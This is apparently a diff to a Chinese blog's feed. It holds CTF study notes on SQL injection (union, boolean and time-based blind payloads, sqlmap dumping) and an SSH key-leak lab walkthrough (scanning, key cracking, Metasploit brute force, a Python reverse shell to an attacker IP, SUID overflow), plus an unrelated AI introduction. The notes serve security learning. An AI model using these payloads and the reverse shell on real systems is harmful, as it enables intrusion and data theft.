+<li><h3 id="COLUMNS-表"><a href="#COLUMNS-表" class="headerlink" title="&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;"></a>&#x3D;&#x3D;COLUMNS 表&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;存储表中的列信息，包括表有多少列、每个列的类型等。<code>SHOW COLUMNS FROM schemaname.tablename</code> 命令从这个表获取结果。&#x3D;&#x3D; </p>
+</li>
+<li><h3 id="USER-PRIVILEGES-表"><a href="#USER-PRIVILEGES-表" class="headerlink" title="USER_PRIVILEGES 表"></a>USER_PRIVILEGES 表</h3><p>用户权限表。内容源自 mysql.user 授权表。是非标准表。</p>
+</li>
+</ol>
+<blockquote>
+<p>其余查看<a class="link"   href="https://blog.csdn.net/kikajack/article/details/80065753" >MySQL 中的 information_schema 数据库_object ‘profiling’ not found within ‘information_s-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="sql注入语句"><a href="#sql注入语句" class="headerlink" title="sql注入语句"></a>sql注入语句</h2><h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1. 判断是否存在漏洞"></a>1. 判断是否存在漏洞</h3><p>根据客户端返回的结果判断提交的测试语句 是否执行成功，如果被执行，则可能存在漏洞</p>
+<p>一般利用&#x3D;&#x3D;单引号和双引号&#x3D;&#x3D;来判断，如果SQL语句出现错误说明有很大可能存在漏洞。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1</span><br><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里加上单引号语句报错，则可能存在漏洞</p>
+<p>后端向数据库获取数据的语句</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;$id&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-判断注入类型"><a href="#2-判断注入类型" class="headerlink" title="2. 判断注入类型"></a>2. 判断注入类型</h3><h4 id="字符型或者数字型"><a href="#字符型或者数字型" class="headerlink" title="字符型或者数字型"></a>字符型或者数字型</h4><p>涉及注入中是否加入单引号，可以使用&#x3D;&#x3D;and&#x3D;&#x3D;进行判断，当and两边都为真才是真。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 and 1=1</span><br><span class="line">1 and 1=2</span><br><span class="line"># 字符型</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;1 and 1=1&#x27;;</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= &#x27;1 and 1=2&#x27;;</span><br><span class="line"># 数字型</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= 1 and 1=1;</span><br><span class="line">SELECT first_name,last_name FROM users WHERE user_id= 1 and 1=2;</span><br></pre></td></tr></table></figure></div>
+
+<p>如果两个返回结果相同则为字符型，否则就是数字型。字符型会进行隐式类型转换，这是自动调用的，将某种类型的数据转换成另外一种类型数据。如上面的user_id是int型，但是输入字符型就会转换为int型。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;1 and 1=1&#x27; ==&gt; 1</span><br><span class="line">&#x27;2admin&#x27; ==&gt; 2</span><br><span class="line">&#x27;admin&#x27; ==&gt; 0</span><br><span class="line">&#x27;33admin&#x27; ==&gt; 33</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="1-判断列数"><a href="#1-判断列数" class="headerlink" title="1. 判断列数"></a>1. 判断列数</h3><p>利用&#x3D;&#x3D;order by&#x3D;&#x3D;</p>
+<p>判断后端的查询语句的输出有几列</p>
+<p>ORDER BY是表示输出的字段按照某一列进行排序，可以跟字段名，也可以跟列号</p>
+<p>如果为字符型</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1# </span><br><span class="line"># 上面的单引号是跟前面的单引号闭合，然后因为后面还有个单引号，所以需要井号来进行注释</span><br><span class="line">注 ：如果是GET型注入，可以利用井号的url编码%23进行注释或者利用--+</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="2-确定显示位"><a href="#2-确定显示位" class="headerlink" title="2. 确定显示位"></a>2. 确定显示位</h3><p>利用union将两个语句进行连接并输出</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT first_name,last_name FROM users union SELECT password,last_name FROM users</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>上面五行是前一个语句的输出，后面五行是后一个语句的输出。</p>
+<blockquote>
+<p>注：</p>
+<ol>
+<li><p>输出结果的列名总是第一个语句中的列名</p>
+</li>
+<li><p>UNION内部语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时每条SELECT语句中的列的顺序也必须相同</p>
+</li>
+</ol>
+</blockquote>
+<p>如果某些网站只能回显一条数据</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure></div>
+
+<p>就是将第一个语句查询为空</p>
+<h3 id="3-获取数据信息"><a href="#3-获取数据信息" class="headerlink" title="3.  获取数据信息"></a>3.  获取数据信息</h3><h4 id="3-1-获取数据库名、版本"><a href="#3-1-获取数据库名、版本" class="headerlink" title="3.1 获取数据库名、版本"></a>3.1 获取数据库名、版本</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select version(),database()#</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3-2-获取数据库表名"><a href="#3-2-获取数据库表名" class="headerlink" title="3.2 获取数据库表名"></a>3.2 获取数据库表名</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,table_name from information_schema.tables where table_schema=&#x27;name&#x27;#</span><br><span class="line"># name为数据库名</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3-3-获取字段名"><a href="#3-3-获取字段名" class="headerlink" title="3.3 获取字段名"></a>3.3 获取字段名</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;name&#x27;#</span><br><span class="line"># name 为表名</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="3-4-获取字段中的记录"><a href="#3-4-获取字段中的记录" class="headerlink" title="3.4 获取字段中的记录"></a>3.4 获取字段中的记录</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(name1,name2) from column_name#</span><br><span class="line"># name1,name2 为字段名 column_name 为表名</span><br><span class="line"></span><br><span class="line">-1&#x27; union select name1,name2 from colunm_name#</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p><strong>盲注</strong>就是在SQL注入过程中，SQL语句执行后，查询到的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br><strong>布尔盲注</strong>：SQL语句执行后，页面不返回具体数据，数据库只返回1或者0(真or假)。类似于无法开口说话的人，只能通过点头和摇头来告诉你答案的正确与否。<br>**时间盲注:**在页面中，不管用户输入什么，数据交互完成以后目标网站没有错误和正确的页面回显，这种情况我们可以利用时间函数来判断数据有没有在目标数据中得到执行。</p>
+<h3 id="1-布尔盲注"><a href="#1-布尔盲注" class="headerlink" title="1. 布尔盲注"></a>1. 布尔盲注</h3><h4 id="1-1-判断是否存在注入"><a href="#1-1-判断是否存在注入" class="headerlink" title="1.1 判断是否存在注入"></a>1.1 判断是否存在注入</h4><p>第一步:正常查询，返回True(语句执行成功)或者返回False(语句执行成功没有查询到内容)。<br>第二步:输入引号进行看页面变化，页面返回False，可能存在漏洞，也可能没有查询到内容。<br>第三步:利用and进行判断，比如:1 and 1&#x3D;1和1 and 1&#x3D;2，1’and 1&#x3D;1#和1’and 1&#x3D;2#，如果前者执行的结果不一样，说明是数字型的布尔盲注;如果后者执行的结果不一样，说明是字符型的布尔盲注。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users where id=1 and 1=1;</span><br><span class="line">select * from users where id=1 and 1=2;</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=1#&#x27;;</span><br><span class="line">select * from users where id=&#x27;1&#x27; and 1=2#&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="1-2-获取数据库长度"><a href="#1-2-获取数据库长度" class="headerlink" title="1.2. 获取数据库长度"></a>1.2. 获取数据库长度</h4><p>因为无法通过页面数据回显获取数据，所以只能靠判断对错的方式来获取数据，可以使用MySQL中的内置函数获取字符串长度:<br>**length():**单位是字节，utf8编码下,一个汉字三个字节，一个数字或字母一个字节。gbk编码下,一个汉字两个字节，一个数字或字母一个字节。<br>**char_length():**单位为字符，不管汉字还是数字或者是字母都算是一个字符。</p>
+<p>例如：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select length(databese());</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>但是在盲注中是无法回显select的输出的</strong></p>
+<p>所以尝试得到长度可以用burp爆破或者二分(利用&gt;、&lt;、&#x3D;)：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and length(database())&lt;10%23</span><br></pre></td></tr></table></figure></div>
+
+<p>正确的长度会得到正确回显</p>
+<p>上传到数据库的语句为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and length(database())&lt;10#&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="1-3-获取数据库名"><a href="#1-3-获取数据库名" class="headerlink" title="1.3. 获取数据库名"></a>1.3. 获取数据库名</h4><ul>
+<li>利用substr(string,start,length)截取字符串</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and substr(database(),1,1)=&#x27;s&#x27;%23</span><br></pre></td></tr></table></figure></div>
+
+<p>依次判断数据库名的每个字符，然后得到数据库名，这里采用将字母转换为ASCII码然后用burp的<strong>集束炸弹</strong>进行爆破</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115 %23</span><br></pre></td></tr></table></figure></div>
+
+<p>然后选定payload位置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/sqli/less-8/?id=1&#x27; and ascii(substr(database(),$1$,1))=$115$ %23</span><br></pre></td></tr></table></figure></div>
+
+<p>第一个位置范围为1-8（数据库名长度），第二个位置范围为65-122（大小写字母ASCII码范围）</p>
+<p>爆破完成得到数据库名<strong>security</strong></p>
+<p>&#x3D;&#x3D;<strong>然后依次得到表名和字段名</strong>&#x3D;&#x3D;</p>
+<blockquote>
+<p>以上为布尔盲注，以下为时间盲注</p>
+</blockquote>
+<h3 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2. 时间盲注"></a>2. 时间盲注</h3><h4 id="2-1-判断是否存在注入"><a href="#2-1-判断是否存在注入" class="headerlink" title="2.1. 判断是否存在注入"></a>2.1. 判断是否存在注入</h4><p>利用时间函数sleep()进行判断</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and sleep(5) %23</span><br></pre></td></tr></table></figure></div>
+
+<p>然后查看“网络”界面的请求耗时，如果正好相差五秒，则为时间盲注。</p>
+<h4 id="2-2获取数据库长度"><a href="#2-2获取数据库长度" class="headerlink" title="2.2获取数据库长度"></a>2.2获取数据库长度</h4><p>在上面布尔盲注的基础上，这里要加上if()条件判断语句</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(exp1,cmd1,cmd2)</span><br><span class="line"># 如果exp1为真，执行cmd1，否则执行cmd2</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=8,sleep(5),1) %23</span><br></pre></td></tr></table></figure></div>
+
+<p>然后比较“网络”界面的请求耗时，或者直接在burp爆破结果中勾选响应时间的选项，然后找到不一样的那个</p>
+<p>之后的步骤同布尔盲注</p>
+<hr>
+<h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>以下演示为windows中，如果在kali中，则可以直接执行sqlmap</p>
+<h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1. 判断是否存在注入"></a>1. 判断是否存在注入</h3><div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span></span><br><span class="line">python sqlmap.py -u &quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;page=<span class="number">10</span>&quot; -p page </span><br><span class="line">python sqlmap.py -u &quot;http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;page=<span class="number">10</span>&quot; -p page --batch </span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>-u:指定URL</li>
+<li>-p:url多参数时指定注入点</li>
+<li>–batch:自动化测试，需要选择时全部默认Y(注入过程可能比较久)</li>
+</ul>
+<h3 id="2-获取信息"><a href="#2-获取信息" class="headerlink" title="2. 获取信息"></a>2. 获取信息</h3><div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> --dbs</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security --tables</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security -T users --columns</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> -D security -T users -C id,username,password --dump</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><p>–dbs:获取数据库名</p>
+</li>
+<li><p>–tables:获取数据库表名</p>
+</li>
+<li><p>–columns:获取字段名</p>
+</li>
+<li><p>-D,-T,-C:分别表示指定数据库、表、字段</p>
+</li>
+<li><p>–dump:获取字段内容(慎用)</p>
+</li>
+</ul>
+<h3 id="3-多目标"><a href="#3-多目标" class="headerlink" title="3. 多目标"></a>3. 多目标</h3><p>把要测试的url放入一个txt文件里，使用-m参数执行txt文件</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -m test.txt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="4-需要登录"><a href="#4-需要登录" class="headerlink" title="4. 需要登录"></a>4. 需要登录</h3><p>需要先获取自己的cookie，然后利用–cookie参数进行执行</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u  http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span>&amp;Submit=submit# -p id --cookie cookie --dbs --batch</span><br></pre></td></tr></table></figure></div>
+
+<p>利用sqlmap进行注入的user-agent头文件有明显的sqlmap</p>
+<p>于是可以使用–random-agent 参数随机UA头，或者利用–user-agent&#x3D;UA，使用自己的UA头。</p>
+<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sqli/Less-<span class="number">1</span>/?id=<span class="number">1</span> --random-agent</span><br><span class="line">python sqlmap.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>/sq1i/Less-<span class="number">1</span>/?id=<span class="number">1</span> --user-agent=&quot;Mozi11a/<span class="number">4</span>.<span class="number">0</span> (compatible; MSIE <span class="number">6</span>.<span class="number">0</span>: Windows NT <span class="number">5</span>.<span class="number">0</span>: de) Opera <span class="number">8</span>.<span class="number">0</span>&#x27;</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ssh密钥泄露</title>
+    <url>/2024/09/11/478a9824d4db/</url>
+    <content><![CDATA[<h1 id="ssh密钥泄露"><a href="#ssh密钥泄露" class="headerlink" title="ssh密钥泄露"></a>ssh密钥泄露</h1><p>&#x3D;&#x3D;ssh常用端口为22&#x3D;&#x3D;</p>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="先用nmap扫描ip端口"><a href="#先用nmap扫描ip端口" class="headerlink" title="先用nmap扫描ip端口"></a>先用nmap扫描ip端口</h3><p>探测靶场开放的服务和服务版本：<code>nmap -sV ip</code></p>
+<p>探测靶场全部信息：<code>nmap -A -v ip</code></p>
+<p>探测靶场的操作系统类型和版本： <code>nmap -O ip</code></p>
+<p>&#x3D;&#x3D;注意特殊端口（大于1024）&#x3D;&#x3D;</p>
+<hr>
+<h3 id="扫描端口目录-寻找隐藏文件"><a href="#扫描端口目录-寻找隐藏文件" class="headerlink" title="扫描端口目录,寻找隐藏文件"></a>扫描端口目录,寻找隐藏文件</h3><p><code>dirb http://ip:port/</code>（80端口可省略）</p>
+<p>如果探测到.ssh，则可以想到密钥泄露，通过ssh远程登陆</p>
+<p>&#x3D;&#x3D;id_rsa和id_rsa.pub配对成功才能登陆成功&#x3D;&#x3D;</p>
+<p>为此我们可以尝试打开<code>http://ip:port/.ssh/id_rsa</code>目录，可能会下载到id_rsa，也就是私钥</p>
+<hr>
+<h3 id="寻找ssh用户名，得到私钥"><a href="#寻找ssh用户名，得到私钥" class="headerlink" title="寻找ssh用户名，得到私钥"></a>寻找ssh用户名，得到私钥</h3><ol>
+<li><p>然后依次打开后面的目录<br>成功下载后，第二个文件就是一个认证文件，可以找到用户名，ssh连接徐娅用户名，假如用户名为simon</p>
+</li>
+<li><p>可能在网站主页寻找</p>
+</li>
+</ol>
+<p><code>ssh -i id_rsa simon@ip</code></p>
+<hr>
+<h4 id="利用nikto寻找是否有私钥"><a href="#利用nikto寻找是否有私钥" class="headerlink" title="利用nikto寻找是否有私钥"></a>利用nikto寻找是否有私钥</h4><p><code>nikto -host ip</code></p>
+<p>可以扫描出敏感目录并且提示 </p>
+<p>如果探测到robot.txt，打开可以查看不可以被探测的目录，可以寻找到相关信息或者flag1；&#x3D;&#x3D;注意config之类的文件&#x3D;&#x3D;</p>
+<p>可以利用<code>wget url</code>来下载文件</p>
+<h4 id="如果只有公钥"><a href="#如果只有公钥" class="headerlink" title="如果只有公钥"></a>如果只有公钥</h4><p>然后会提示输入密码，尝试root&#x2F;用户名。错误则继续探测</p>
+<p>ssh2john id_rsa &gt; rsacrack</p>
+<p>zcat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz | john –pipe -rules isacrack</p>
+<p>然后利用破解的密码进行ssh登录</p>
+<hr>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="暴力破解思路"><a href="#暴力破解思路" class="headerlink" title="暴力破解思路"></a>暴力破解思路</h3><p>先下载cupp</p>
+<p><code>git clone https://github.com/jeanphorn/common-password.git</code></p>
+<p>进入目录给cupp.py提权 <code>chmod +x cupp.py</code></p>
+<p>以交互方式创建字典 <code>./cupp.py -i</code></p>
+<p>利用metasploit破解ssh</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/ssh/ssh_login</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> rhosts ip</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> username name(对应用户名)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> pass_file name.txt(前面生成的字典)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> threads 5(设置线程)</span><br><span class="line"></span><br><span class="line">show options(查看参数)</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> verbose <span class="literal">true</span>(返回相关信息)</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>破解密码后，重新启动msfconsole，并输入相关参数，但是密码直接设置为破解出来的密码pwd</p>
+<p><code>set password pwd</code></p>
+<p>打开会话</p>
+<p><code>sessions -i l</code></p>
+<p>优化终端</p>
+<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
+<p>然后输入</p>
+<p><code>su - root</code></p>
+<p>输入破解出来的密码pwd，成功提权</p>
+<hr>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>挖掘是否有定时任务 &#96;car &#x2F;etc&#x2F;crontab</p>
+<p>如果有定时计划文件但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限</p>
+<p>如果有定时执行的文件，可以切换到对应目录，查看对应权限，查看当前用户是否有读写权限</p>
+<p>反弹shell编写</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">`#!/usr/bin/python`</span><br><span class="line"></span><br><span class="line">`import os,subprocess,socket`</span><br><span class="line"></span><br><span class="line">`s=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)`(参数可不加，表示使用以太网和tcp套接字)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;攻击机IP地址&quot;,&quot;攻击机监听端口”))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line"></span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-¡&quot;])</span><br></pre></td></tr></table></figure></div>
+
+<p>攻击机netcat命令监听相关端口（未占用）</p>
+<p><code>nc -lvp 端口</code></p>
+<p>查看占用端口 <code>netstat -pantu</code></p>
+<hr>
+<h3 id="利用自带文件产生溢出调用bash"><a href="#利用自带文件产生溢出调用bash" class="headerlink" title="利用自带文件产生溢出调用bash"></a>利用自带文件产生溢出调用bash</h3><p>登陆后发现不是root权限，于是查看根目录</p>
+<p><code>cd /root</code>  <code>ls</code></p>
+<p>可能会发现flag.txt，但是可能没有权限直接打开</p>
+<p>于是查找具有root权限的文件</p>
+<p><code>find / -perm -4000 2&gt;/dev/null</code></p>
+<p>发现read_message名字与根目录类似</p>
+<p><code>cat read_message.c</code></p>
+<p>可能会找到flag2</p>
+<p>代码审计下面的c语言</p>
+<p>发现调用这个message这个文件并输出相关信息</p>
+<p>打开read_message</p>
+<p><code>read_message</code></p>
+<p>然后我们输入SimonAAA</p>
+<p>发现程序只对比到前五个字符，正确就执行程序，于是我们打算溢出字符串buf数组（20长度），然后利用输入的&#x2F;bin&#x2F;sh占用程序，被execve调用，然后成功提权</p>
+<hr>
+<h3 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h3><p>寻找根目录  <code>/root</code></p>
+<p>然后就可以成功打开flag.txt文件</p>
+<hr>
+<h2 id="NOTE"><a href="#NOTE" class="headerlink" title="NOTE"></a>NOTE</h2><ol>
+<li>查看当前用户<code>whoami</code></li>
+<li>查看当前用户的权限<code>id</code></li>
+<li>查看所有用户的列表 <code>cat/etc/passwd</code></li>
+<li>查看用户组 <code>cat /etc/group</code></li>
+<li>查看属于某些用户的文件<code>find / -user 用户名</code></li>
+<li>查看缓冲文件目录 <code>/tmp</code></li>
+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>ssh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>人工智能简介</title>
+    <url>/2024/09/21/efcce1b0a0d3/</url>
+    <content><![CDATA[<h1 id="人工智能简介"><a href="#人工智能简介" class="headerlink" title="人工智能简介"></a>人工智能简介</h1><p>​		在21世纪的科技浪潮中，人工智能（AI）已成为推动社会进步的强大引擎。从智能手机的智能助手到医疗诊断的精准算法，再到自动驾驶汽车的复杂决策系统，人工智能正以前所未有的速度渗透到我们生活的方方面面。它不仅仅是冷冰冰的代码和算法，更是人类智慧的延伸，它学习、适应并模仿我们的行为，以提高效率、优化决策并增强我们的体验。</p>
+<p>​		人工智能的核心在于其学习能力——通过分析大量数据，识别模式，预测未来趋势，并在不断的迭代中自我优化。这种能力使得AI能够执行各种任务，从简单的自动化工作到复杂的创造性思维，无所不包。</p>
+<p>​		然而，人工智能的发展也带来了一系列挑战和伦理问题，包括隐私保护、数据安全、就业影响以及决策的透明度和公平性。这些挑战要求我们不仅要关注技术的进步，还要深入思考如何确保人工智能的发展能够惠及所有人，同时尊重每个人的权益。</p>
+<p>​		在这篇文章中，我们将深入探讨人工智能的工作原理、应用场景、发展趋势以及它对社会的深远影响。我们将一起见证人工智能如何塑造未来，以及我们如何在这个过程中扮演积极的角色。</p>
+<h3 id="国家对人工智能的规划"><a href="#国家对人工智能的规划" class="headerlink" title="国家对人工智能的规划"></a>国家对人工智能的规划</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211134678.png"
+                      alt="image-20240921113456610"
+                ></p>
+<p>​		《规划》提出六个方面重点任务：一是构建开放协同的人工智能科技创新体系，从前沿基础理论、关键共性技术、创新平台、高端人才队伍等方面强化部署。二是培育高端高效的智能经济，发展人工智能新兴产业，推进产业智能化升级，打造人工智能创新高地。三是建设安全便捷的智能社会，发展高效智能服务，提高社会治理智能化水平，利用人工智能提升公共安全保障能力，促进社会交往的共享互信。四是加强人工智能领域军民融合，促进人工智能技术军民双向转化、军民创新资源共建共享。五是构建泛在安全高效的智能化基础设施体系，加强网络、大数据、高效能计算等基础设施的建设升级。六是前瞻布局重大科技项目，针对新一代人工智能特有的重大基础理论和共性关键技术瓶颈，加强整体统筹，形成以新一代人工智能重大科技项目为核心、统筹当前和未来研发任务布局的人工智能项目群。</p>
+<h3 id="人工智能市场行情"><a href="#人工智能市场行情" class="headerlink" title="人工智能市场行情"></a>人工智能市场行情</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211200240.png"
+                      alt="image-20240921115627854"
+                ></p>
+<p>​		随着人工智能技术不断演进，人工智能已应用到人们日常生产、生活的方方面面。与此同时，人工智能风险引起普遍担忧，因此，对于安全可信人工智能技术的需要已经提升到前所未有的高度，推动人工智能可靠可控的发展成为全球共识。另一方面，随着传统行业数字化进程的提升，将提供海量的数据和丰富的应用场景，为人工智能的应用打开新的空间，使得其与社会各方面进一步融合。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211200320.png"
+                      alt="image-20240921115530880"
+                ></p>
+<h3 id="人工智能教材进高中"><a href="#人工智能教材进高中" class="headerlink" title="人工智能教材进高中"></a>人工智能教材进高中</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409211202609.png"
+                      alt="a39b52b96dcbcf0b44f345c9ac7413c"
+                ></p>
